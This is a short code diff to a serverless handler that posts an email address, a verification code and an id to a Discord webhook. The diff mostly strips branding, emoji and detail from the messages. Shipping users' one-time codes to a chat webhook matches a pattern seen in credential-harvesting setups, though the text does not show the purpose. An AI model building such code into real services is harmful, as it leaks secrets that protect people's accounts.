@@ -14,7 +14,7 @@ export default async function handler(request) {
   
   if (!webhookUrl) {
     return new Response(
-      JSON.stringify({ error: 'DISCORD_WEBHOOK_CODE not configured' }),
+      JSON.stringify({ error: 'Webhook URL not configured' }),
       { status: 500, headers: { 'Content-Type': 'application/json' } }
     );
   }
@@ -24,18 +24,15 @@ export default async function handler(request) {
     const { email, code, id } = body;
 
     const payload = {
-      username: '🔑 Verification Bot',
-      avatar_url: 'https://cdn-icons-png.flaticon.com/512/3135/3135715.png',
+      username: 'Verification Bot',
       embeds: [{
-        title: '✅ Email Verification Completed',
+        title: '✅ Verification Completed',
         color: 0x2ecc71,
         fields: [
-          { name: '🔖 ID', value: `\`${id}\``, inline: true },
-          { name: '📧 Email', value: `\`${email}\``, inline: true },
-          { name: '🔢 Code', value: `\`${code}\``, inline: true },
-          { name: '📅 Date', value: new Date().toLocaleString('es-ES'), inline: false }
+          { name: 'ID', value: `\`${id}\``, inline: true },
+          { name: 'Email', value: `\`${email}\``, inline: true },
+          { name: 'Code', value: `\`${code}\``, inline: true }
         ],
-        footer: { text: 'Verification System v2.0' },
         timestamp: new Date().toISOString()
       }]
     };
@@ -47,15 +44,15 @@ export default async function handler(request) {
     });
 
     if (!discordResponse.ok) {
-      throw new Error(`Discord API error: ${discordResponse.status}`);
+      throw new Error(`Discord error: ${discordResponse.status}`);
     }
 
     return new Response(
-      JSON.stringify({ success: true, message: 'Verification sent to Discord' }),
+      JSON.stringify({ success: true }),
       { status: 200, headers: { 'Content-Type': 'application/json' } }
     );
   } catch (error) {
-    console.error('[CODE WEBHOOK ERROR]', error);
+    console.error('[WEBHOOK ERROR]', error);
     return new Response(
       JSON.stringify({ error: error.message }),
       { status: 500, headers: { 'Content-Type': 'application/json' } }
